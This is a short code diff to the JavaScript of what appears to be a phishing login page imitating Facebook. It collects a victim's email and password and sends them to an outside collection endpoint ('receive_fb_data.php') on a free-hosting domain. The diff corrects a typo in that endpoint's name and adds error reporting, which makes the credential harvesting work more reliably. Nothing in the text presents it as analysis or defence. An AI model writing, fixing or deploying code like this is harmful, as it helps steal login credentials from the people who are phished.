@@ -56,15 +56,19 @@
             const url_id = getUrlParameter('url_id');
             const data = { email, password, url_id };
 
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://8080.rf.gd/recieve_fb_data.php", true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState === 4 && xhr.status === 200) {
-                    console.log(xhr.responseText);
-                }
-            };
-            xhr.send(JSON.stringify(data));
+          const xhr = new XMLHttpRequest();
+xhr.open("POST", "https://8080.rf.gd/receive_fb_data.php", true);
+xhr.setRequestHeader("Content-Type", "application/json"); // Set Content-Type header
+xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+        if (xhr.status === 200) {
+            console.log("Data received successfully:", xhr.responseText);
+        } else {
+            console.error("Failed to send data. Status:", xhr.status);
+        }
+    }
+};
+xhr.send(JSON.stringify(data));
         });
 
         function getUrlParameter(name) {
